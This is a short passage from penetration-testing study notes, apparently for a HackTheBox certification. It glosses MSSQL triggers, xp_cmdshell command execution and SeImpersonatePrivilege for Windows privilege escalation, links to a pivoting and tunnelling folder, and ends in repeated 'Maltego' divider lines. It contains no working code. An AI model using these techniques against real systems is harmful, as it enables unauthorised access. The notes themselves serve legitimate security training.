| MSSQL Trigger            | Database event executes configured commands          |
| `xp_cmdshell`            | Runs Windows commands through MSSQL                  |
| `SeImpersonatePrivilege` | Important privilege for Windows privilege escalation |




## Lateral Movement and Pivoting

### [LMP](https://github.com/OxL3on/HackTheBox/tree/main/CPTS/Pivoting%2C%20Tunneling%2C%20and%20Port%20Forwarding/TryHackMe)





### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
### --------------------------------- Maltego -----------------------------------
